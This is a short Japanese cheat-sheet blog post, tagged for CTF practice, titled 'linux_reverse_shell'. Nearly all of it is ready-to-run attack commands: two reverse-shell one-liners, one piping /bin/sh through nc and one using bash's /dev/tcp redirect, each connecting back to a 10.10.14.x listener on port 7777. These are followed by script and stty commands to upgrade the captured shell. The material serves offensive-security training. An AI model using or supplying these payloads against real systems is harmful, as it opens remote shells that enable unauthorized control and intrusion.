---
layout: post
title: "linux_reverse_shell"
published : true
tags: CTF Common cheatsheet linux "reverse shell"
---
## リバースシェル
コマンド1
```sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.19 7777 >/tmp/f
```
コマンド2
```sh
bash -c "bash -i >& /dev/tcp/10.10.14.14/7777 0>&1"
```
## シェルのアップグレード
```sh
script /dev/null -c bash
```

## シェルをさらにアップグレード
```sh
(Ctrl + z)
stty raw -echo ; fg
```
